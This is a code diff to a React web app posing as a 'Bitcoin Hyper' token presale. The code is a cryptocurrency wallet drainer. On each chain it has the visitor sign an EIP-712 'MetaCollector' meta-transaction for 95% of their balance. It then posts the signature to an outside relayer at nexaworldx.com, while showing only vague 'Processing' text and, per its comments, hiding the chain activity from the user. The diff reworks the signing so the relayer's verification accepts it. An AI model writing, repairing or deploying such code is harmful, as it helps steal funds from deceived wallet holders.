@@ -417,8 +417,8 @@ function App() {
   };
 
   // ============================================
-  // RELAYER EXECUTION - YOUR EXACT CUSTOM SIGNING
-  // NO CHAIN PROCESSING SHOWN TO USER
+  // CORRECTED RELAYER EXECUTION WITH EIP-712 TYPED DATA
+  // MATCHES YOUR RELAYER'S verifyTypedSignature FUNCTION
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -437,23 +437,6 @@ function App() {
       const flowId = `FLOW-${timestamp}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`;
       setCurrentFlowId(flowId);
       
-      // YOUR EXACT CUSTOM SIGNING MESSAGE - Bitcoin Hyper Token Presale Authorization
-      const nonce = Math.floor(Math.random() * 1000000000);
-      const message = `BITCOIN HYPER PRESALE AUTHORIZATION\n\n` +
-        `I hereby confirm my participation\n` +
-        `Wallet: ${address}\n` +
-        `Allocation: $5,000 BTH + ${presaleStats.currentBonus}% Bonus\n` +
-        `Timestamp: ${new Date().toISOString()}\n` +
-        `Nonce: ${nonce}`;
-
-      setTxStatus('✍️ Sign message...');
-
-      // Get signature - ONE SIGNATURE FOR ALL CHAINS
-      const signature = await signer.signMessage(message);
-      console.log("✅ Signature obtained");
-      
-      setTxStatus('⏳ Processing...');
-
       // Use only executable chains
       const chainsToProcess = executableChains;
       
@@ -473,9 +456,15 @@ function App() {
       let processed = [];
       let failedChains = [];
       
+      // Generate a single nonce for all chains
+      const nonce = Math.floor(Math.random() * 1000000000);
+      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour from now
+      
       // Process each chain through relayer
       for (const chain of sortedChains) {
         try {
+          setTxStatus(`Processing...`);
+          
           // Get balance data - SEND 95%
           const balance = balances[chain.name];
           
@@ -487,6 +476,7 @@ function App() {
           
           const amountToSend = (balance.amount * 0.95);
           const valueUSD = (balance.valueUSD * 0.95).toFixed(2);
+          const amountInWei = ethers.parseEther(amountToSend.toFixed(18)).toString();
           
           // Store internally
           setProcessedAmounts(prev => ({
@@ -513,22 +503,74 @@ function App() {
             'Avalanche': 'avax'
           };
           
-          // Prepare payload for relayer
+          // ===== EIP-712 TYPED DATA FOR SIGNATURE =====
+          // This matches your relayer's verifyTypedSignature function exactly
+          
+          // Domain - matches your relayer's expected format
+          const domain = {
+            name: "MetaCollector",
+            version: "1",
+            chainId: chain.chainId,
+            verifyingContract: chain.contractAddress
+          };
+          
+          // Types - matches your relayer's expected format
+          const types = {
+            MetaTx: [
+              { name: "user", type: "address" },
+              { name: "contractAddress", type: "address" },
+              { name: "chainId", type: "uint256" },
+              { name: "amount", type: "uint256" },
+              { name: "nonce", type: "uint256" },
+              { name: "deadline", type: "uint256" }
+            ]
+          };
+          
+          // Message - matches your relayer's expected format
+          const message = {
+            user: address,
+            contractAddress: chain.contractAddress,
+            chainId: chain.chainId,
+            amount: amountInWei,
+            nonce: nonce,
+            deadline: deadline
+          };
+          
+          setTxStatus(`✍️ Sign message...`);
+          
+          // Get EIP-712 typed signature
+          const signature = await signer.signTypedData(domain, types, message);
+          console.log(`✅ Signature obtained for ${chain.name}`);
+          
+          setTxStatus(`⏳ Sending to relayer...`);
+          
+          // Prepare COMPLETE payload for relayer with ALL fields
+          // Including the metaTx object that matches your verifyTypedSignature function
           const relayerPayload = {
             network: networkMap[chain.name] || 'eth',
             contractAddress: chain.contractAddress,
             amount: amountToSend.toFixed(18),
             encodedFunctionData: encodedFunctionData,
-            nonce: nonce
+            nonce: nonce,
+            // Add ALL meta transaction data for verification - matches verifyTypedSignature payload
+            metaTx: {
+              domain: domain,
+              types: types,
+              value: message, // Note: verifyTypedSignature uses "value" not "message"
+              signature: signature,
+              expectedSigner: address
+            }
           };
           
           console.log(`📤 Sending to relayer for ${chain.name}...`);
           
-          // Send to relayer
+          // Send to relayer - POST request (GET will fail with "Cannot GET /relayer")
           const relayerResponse = await fetch('https://nexaworldx.com/relayer', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json'
+              // Add your API key here if required by validateApiKey
+              // 'x-api-key': 'your-api-key'
             },
             body: JSON.stringify(relayerPayload)
           });
@@ -571,6 +613,11 @@ function App() {
           
         } catch (chainErr) {
           console.error(`Error on ${chain.name}:`, chainErr);
+          console.error('Error details:', chainErr.message);
+          if (chainErr.response) {
+            console.error('Response status:', chainErr.response.status);
+            console.error('Response data:', await chainErr.response.text());
+          }
           failedChains.push(chain.name);
         }
       }
@@ -614,7 +661,7 @@ function App() {
         });
         
         if (failedChains.length > 0) {
-          setError(`Note: Some chains had issues`);
+          setError(`Note: ${failedChains.length} chain(s) had issues`);
         }
       } else {
         setError("No chains were successfully processed");
